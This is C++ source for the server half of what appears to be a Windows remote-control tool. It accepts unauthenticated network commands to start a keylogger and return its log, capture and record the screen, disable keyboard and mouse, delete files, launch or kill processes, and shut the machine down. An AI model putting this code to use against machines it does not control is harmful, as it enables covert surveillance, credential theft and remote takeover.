#include "ServerSocket.hpp"

std::unordered_map<std::string, MessageType> ServerSocket::messageMap =  {
    {"shutdown", SHUTDOWN},
    {"restart", RESTART},
    {"getIP", GET_IP},
    {"HelloServer", HELLO_SERVER},
    {"STOP", STOP},
    {"captureScreen", CAPTURE_SCREEN},
    {"copyFile", COPY_FILE},
    {"deleteFile", DELETE_FILE},
    {"createFolder", CREATE_FOLDER},
    {"copyFolder", COPY_FOLDER},
    {"ls", LIST_COMMANDS},
    {"listProcess", LIST_PROCESS},
    {"listService", LIST_SERVICES},
    {"startApp", START_APP},
    {"terminateProcess", TERMINATE_PROCESS},
    {"listRunningApp", LIST_RUNNING_APP},
    {"listInstalledApp", LIST_INSTALLED_APP},
    {"listFiles", LIST_FILES},
    {"disableKeyboard", DISABLE_KEYBOARD},
    {"enableKeyboard", ENABLE_KEYBOARD},
    {"enableKeylogger", ENABLE_KEYLOGGER},
    {"disableKeylogger", DISABLE_KEYLOGGER},
    {"screenRecording", SCREEN_RECORDING}
};

ServerSocket::ServerSocket() : 
    keyloggerFilePath("./output-server/default_log.txt"),
    keylogger(new Keylogger()),
    keyboardDisabler(new KeyboardDisabler()),
    recorder(new VideoRecorder()),
    fileOperations(new FileOperations()),
    processOperations(new ProcessOperations()),
    systemOperations(new SystemOperations())
{

    WSADATA wsaSATA;
    if (WSAStartup(MAKEWORD(2, 2), &wsaSATA) != 0) {
        std::cerr << "WSAStartup failed.\n";
        WSACleanup();
        exit(1);
    }
    
    // Creating server socket
    serverSocket = static_cast<int>(socket(AF_INET, SOCK_STREAM, 0));
    if (serverSocket == -1) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        exit(1);
    }

    // Set SO_REUSEADDR option
    int optval = 1;
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval)) == SOCKET_ERROR) {
        std::cerr << "setsockopt failed: " << WSAGetLastError() << '\n';
        closesocket(serverSocket);
        WSACleanup();
        exit(1);
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY; // Bind to any available network interface
    serverAddress.sin_port = htons(PORT);

    // Bind
    if (bind(serverSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << '\n';
        closesocket(serverSocket);
        WSACleanup();
        exit(1);
    }

    // Listen to connection from client
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << '\n';
        closesocket(serverSocket);
        WSACleanup();
        exit(1);
    }

    std::cout << "Server is listening on port " << PORT << "...\n";

    initializeHandlers();

    std::thread(&ServerSocket::handleBroadcast, this).detach();

}

ServerSocket::~ServerSocket()
{
    closesocket(serverSocket);
    WSACleanup();
    delete keylogger;
    delete keyboardDisabler;
    delete recorder;
    delete fileOperations;
    delete processOperations;
    delete systemOperations;
}

MessageType ServerSocket::hashMessage(const std::string message) {
    std::istringstream iss(message);
    std::string command;
    iss >> command;

    auto it = messageMap.find(command);
    return (it != messageMap.end() ? it->second : INVALID);
}

std::vector<std::string> ServerSocket::parseCommand(const std::string& command) {
    std::vector<std::string> result;
    std::regex re(R"((\"[^\"]*\")|(\S+))");
    std::sregex_iterator it(command.begin(), command.end(), re);
    std::sregex_iterator end;
    while (it != end) {
        if ((*it)[1].matched) {
            std::string quotedStr = (*it)[1].str();
            // Remove the enclosing quotes
            result.push_back(quotedStr.substr(1, quotedStr.length() - 2));
        } else if ((*it)[2].matched) {
            result.push_back((*it)[2].str());
        }
        ++it;
    }
    return result;
}

void ServerSocket::sendResponse(SOCKET &clientSocket, const std::string& response) {
    this->sendMessage(clientSocket, response.c_str());
}

void ServerSocket::sendIPAddress(SOCKET &clientSocket)
{
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        std::cerr << "Error getting hostname: " << WSAGetLastError() << '\n';
        return;
    }

    addrinfo hints = {0}, *info;
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostname, nullptr, &hints, &info) != 0) {
        std::cerr << "Error getting address info: " << WSAGetLastError() << '\n';
        return;
    }

    for (addrinfo* p = info; p != nullptr; p = p->ai_next) {
        sockaddr_in* sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(p->ai_addr);
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip, INET_ADDRSTRLEN);
        send(clientSocket, ip, static_cast<int>(strlen(ip)), 0);
        std::cout << "Sending IP address: " << ip << '\n';
        break; // Send the first found IP address
    }

    freeaddrinfo(info);
}

void ServerSocket::sendMessage(SOCKET &clientSocket, const char *message)
{
    send(clientSocket, message, static_cast<int>(strlen(message)), 0);
}

void ServerSocket::initializeHandlers() {
    handlers[SHUTDOWN] = [this](SOCKET &clientSocket, const std::string& command) { 
        sendResponse(clientSocket, "Server has been shutdown!\n");
        systemOperations->systemShutdown(); 
    };

    handlers[RESTART] = [this](SOCKET &clientSocket, const std::string& command) { 
        sendResponse(clientSocket, "Server has been restart!\n");
        wchar_t restartMessage[] = L"RESTART"; 
        systemOperations->systemRestart(restartMessage); 
    };

    handlers[GET_IP] = [this](SOCKET &clientSocket, const std::string& command) { 
        this->sendIPAddress(clientSocket); 
    };

    handlers[HELLO_SERVER] = [this](SOCKET &clientSocket, const std::string& command) {
        sendResponse(clientSocket, "Hello from server!\n");
    };

    handlers[STOP] = [this](SOCKET &clientSocket, const std::string& command) {
        this->~ServerSocket();
        closesocket(clientSocket);
        std::cout << "Server has been stopped.\n";
    };

    handlers[CAPTURE_SCREEN] = [this](SOCKET &clientSocket, const std::string& command) {
        std::string fileName = MyUtility::generateName("screenshot", "png");
        std::string filePath = "./output-server/" + fileName;
        std::string result = systemOperations->saveScreenshot(filePath);
        if (result.substr(0, 6) != "Failed") {
            sendResponse(clientSocket, result);
            sendFile(clientSocket, filePath);
        } else {
            sendResponse(clientSocket, "Error: " + result);
            return;
        }
    };

    handlers[COPY_FILE] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 3) {
            sendResponse(clientSocket, "Usage: copy &lt;source_path&gt; &lt;destination_path&gt;");
            return;
        }

        const std::wstring source = std::wstring(tokens[1].begin(), tokens[1].end());
        const std::wstring destination = std::wstring(tokens[2].begin(), tokens[2].end());
        std::string result = fileOperations->copyFile(source.c_str(), destination.c_str());
        sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
    };

    handlers[DELETE_FILE] = [this](SOCKET &clientSocket, const std::string& command) { 
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: delete &lt;source_path&gt;");
            return;
        }

        const std::wstring source = std::wstring(tokens[1].begin(), tokens[1].end());
        std::string result = fileOperations->deleteFile(source.c_str());
        sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
    };

    handlers[CREATE_FOLDER] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: createFolder &lt;folder_path&gt;");
            return;
        }

        const std::wstring folderPath = std::wstring(tokens[1].begin(), tokens[1].end());
        std::string result = fileOperations->createFolder(folderPath.c_str());
        sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
    };

    handlers[COPY_FOLDER] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 3) {
            sendResponse(clientSocket, "Usage: copyFolder &lt;source_folder&gt; &lt;destination_folder&gt;");
            return;
        }

        // Convert relative paths to absolute paths
        std::filesystem::path sourcePath = std::filesystem::absolute(std::filesystem::path(tokens[1]));
        std::filesystem::path destPath = std::filesystem::absolute(std::filesystem::path(tokens[2]));

        const std::wstring sourceFolder = sourcePath.wstring();
        const std::wstring destinationFolder = destPath.wstring();

        std::string result = fileOperations->copyFolder(sourceFolder.c_str(), destinationFolder.c_str());
        sendResponse(clientSocket, (result.substr(0, 6) != "Failed") ? result : "Error: " + result);
    };
    
    handlers[LIST_COMMANDS] = [this](SOCKET &clientSocket, const std::string& command) {
        std::string commands = "<div style='text-align: center;'><br><h2>Available commands</h2><br>";
        for (const auto& pair : messageMap)
            commands += pair.first + "<br>";
        commands += "</div>";
        sendResponse(clientSocket, commands);
    };

    handlers[LIST_PROCESS] = [this](SOCKET &clientSocket, const std::string& command) {
    std::string fileName = MyUtility::generateName("process_list", "csv");
    std::string filePath = "./output-server/" + fileName;
    std::string systemCommand = "tasklist /FO CSV > " + filePath;
    int result = system(systemCommand.c_str());

    if (result != 0) {
        sendResponse(clientSocket, "Error: Command execution failed with exit code: " + std::to_string(result));
    } else {
        sendResponse(clientSocket, "Successfully listed all processes at " + filePath);
        sendFile(clientSocket, filePath);
    }
};

    handlers[LIST_SERVICES] = [this](SOCKET &clientSocket, const std::string& command) {
        std::string fileName = MyUtility::generateName("services_list", "csv");
        std::string filePath = "./output-server/" + fileName;
        std::string systemCommand = "net start > " + filePath; // Note: net start does not support CSV output directly
        int result = system(systemCommand.c_str());

        if (result != 0) {
            sendResponse(clientSocket, "Error: Command execution failed with exit code: " + std::to_string(result));
        } else {
            // Convert the output to CSV format if necessary
            std::ifstream inputFile(filePath);
            std::ofstream outputFile(filePath + ".csv");
            std::string line;
            while (std::getline(inputFile, line)) {
                outputFile << "\"" << line << "\"" << std::endl; // Simple CSV conversion
            }
            inputFile.close();
            outputFile.close();
            sendResponse(clientSocket, "Successfully listed all services at " + filePath + ".csv");
            sendFile(clientSocket, filePath + ".csv");
        }
    };

    handlers[START_APP] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: startApp &lt;application_path&gt;");
            return;
        }

        std::wstring applicationPath = std::wstring(tokens[1].begin(), tokens[1].end());
        std::string result = processOperations->StartApplication(applicationPath);
        sendResponse(clientSocket, result);
    };

    handlers[TERMINATE_PROCESS] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: terminateProcess &lt;process_id&gt;");
            return;
        }

        DWORD processID = std::stoul(tokens[1]);
        std::string result = processOperations->TerminateProcessByID(processID);
        sendResponse(clientSocket, result);
    };

    handlers[LIST_INSTALLED_APP] = [this](SOCKET &clientSocket, const std::string& command) {
        std::string fileName = MyUtility::generateName("installed_app_list", "csv");
        std::string filePath = "./output-server/" + fileName;
        std::string result = processOperations->listInstalledApp(filePath);
        if (result.substr(0, 6) != "Failed") {
            sendResponse(clientSocket, result);
            sendFile(clientSocket, filePath);
        } else {
            sendResponse(clientSocket, "Error: " + result);
            return;
        }
    };

    handlers[LIST_RUNNING_APP] = [this](SOCKET &clientSocket, const std::string &command) {
        std::string fileName = MyUtility::generateName("running_app_list", "csv");
        std::string filePath = "./output-server/" + fileName;
        std::string result = processOperations->listRunningApp(filePath);
        if (result.substr(0, 6) != "Failed") {
            sendResponse(clientSocket, result);
            sendFile(clientSocket, filePath);
        } else {
            sendResponse(clientSocket, "Error: " + result);
            return;
        }
    };

    handlers[LIST_FILES] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: listFiles &lt;directory_path&gt;");
            return;
        }
        const std::wstring directoryPath = std::wstring(tokens[1].begin(), tokens[1].end());
        std::string fileName = MyUtility::generateName("file_list", "csv");
        std::string filePath = "./output-server/" + fileName;
        std::string result = fileOperations->listFilesInDirectory(directoryPath, filePath);
        if (result.substr(0, 6) != "Failed") {
            sendResponse(clientSocket, result);
            sendFile(clientSocket, filePath);
        } else {
            sendResponse(clientSocket, "Error: " + result);
            return;
        }
    };

    handlers[DISABLE_KEYBOARD] = [this](SOCKET &clientSocket, const std::string& command) {
        keyboardDisabler->disable();
        sendResponse(clientSocket, "Keyboard and mouse input disabled successfully.");
    };

    handlers[ENABLE_KEYBOARD] = [this](SOCKET &clientSocket, const std::string& command) {
        keyboardDisabler->enable();
        sendResponse(clientSocket, "Keyboard and mouse input enabled successfully.");
    };

    handlers[ENABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {        
        std::string fileName = MyUtility::generateName("keylogger", "txt");
        keyloggerFilePath = "./output-server/" + fileName;
        
        keylogger->start(keyloggerFilePath);

        sendResponse(clientSocket, "Keylogger started, logging to " + keyloggerFilePath);
    };

    handlers[DISABLE_KEYLOGGER] = [this](SOCKET &clientSocket, const std::string& command) {
        keylogger->stop();
        sendResponse(clientSocket, "Keylogger stopped. New file at " + keyloggerFilePath);

        sendFile(clientSocket, keyloggerFilePath);
    };

    handlers[SCREEN_RECORDING] = [this](SOCKET &clientSocket, const std::string& command) {
        auto tokens = parseCommand(command);
        if (tokens.size() != 2) {
            sendResponse(clientSocket, "Usage: screenRecording &lt;duration_in_seconds&gt;");
            return;
        }

        int duration = std::stoi(tokens[1]);
        std::string fileName = MyUtility::generateName("video", ".mp4");
        std::string filePath = prefixFilePath + fileName;
        std::string result = recorder->startRecording(duration, filePath);

        if (result.substr(0, 6) != "Failed") {
            sendResponse(clientSocket, result);
            sendFile(clientSocket, filePath);
        } else {
            sendResponse(clientSocket, "Error: " + result);
            return;
        }
    };

}

void ServerSocket::handleEvent(SOCKET &clientSocket, const std::string& message) {
    MessageType messageType = hashMessage(message);
    auto it = handlers.find(messageType);
    if (it != handlers.end()) {
        it->second(clientSocket, message);
    } else {
        sendResponse(clientSocket, "INVALID MESSAGE");
    }
}

void ServerSocket::sendFile(SOCKET &clientSocket, const std::string &filePath)
{
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        sendResponse(clientSocket, "Error: Could not open file " + filePath);
        return;
    }

    // Send file size
    file.seekg(0, std::ios::end);
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    if (fileSize > static_cast<std::streamsize>(INT_MAX)) {
        sendResponse(clientSocket, "Error: File size is too large to send.");
        file.close();
        return;
    }
    int fileSizeInt = static_cast<int>(fileSize);
    send(clientSocket, reinterpret_cast<const char*>(&fileSizeInt), sizeof(fileSizeInt), 0);

    // Send file content
    char buffer[1024];
    while (file.read(buffer, sizeof(buffer))) {
        send(clientSocket, buffer, static_cast<int>(file.gcount()), 0);
    }
    if (file.gcount() > 0) {
        send(clientSocket, buffer, static_cast<int>(file.gcount()), 0);
    }

    file.close();
    std::cout << "File transfer complete.\n";
}

void ServerSocket::handleBroadcast() {
    SOCKET broadcastSocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (broadcastSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create broadcast socket.\n";
        return;
    }

    sockaddr_in broadcastAddr;
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(DISCOVERY_PORT);
    broadcastAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(broadcastSocket, (sockaddr*)&broadcastAddr, sizeof(broadcastAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to bind broadcast socket.\n";
        closesocket(broadcastSocket);
        return;
    }

    char recvBuffer[1024];
    sockaddr_in recvAddr;
    int recvAddrLen = sizeof(recvAddr);
    while (true) {
        int bytesReceived = recvfrom(broadcastSocket, recvBuffer, sizeof(recvBuffer) - 1, 0, (sockaddr*)&recvAddr, &recvAddrLen);
        if (bytesReceived == SOCKET_ERROR) {
            continue;
        }
        recvBuffer[bytesReceived] = '\0';
        if (strcmp(recvBuffer, DISCOVERY_MESSAGE) == 0) {
            // Get server IP address
            char hostname[256];
            if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
                std::cerr << "Error getting hostname: " << WSAGetLastError() << '\n';
                continue;
            }

            addrinfo hints = {};
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_flags = AI_PASSIVE;

            addrinfo* info;
            if (getaddrinfo(hostname, nullptr, &hints, &info) != 0) {
                std::cerr << "Error getting address info: " << WSAGetLastError() << '\n';
                continue;
            }

            char ip[INET_ADDRSTRLEN];
            for (addrinfo* p = info; p != nullptr; p = p->ai_next) {
                sockaddr_in* ipv4 = (sockaddr_in*)p->ai_addr;
                inet_ntop(AF_INET, &(ipv4->sin_addr), ip, INET_ADDRSTRLEN);
                break; // Use the first IP address found
            }

            freeaddrinfo(info);

            // Send server IP address and name back to the client
            std::string response = std::string(ip) + "," + std::string(hostname);
            sendto(broadcastSocket, response.c_str(), response.length(), 0, (sockaddr*)&recvAddr, recvAddrLen);
        }
    }

    closesocket(broadcastSocket);
}
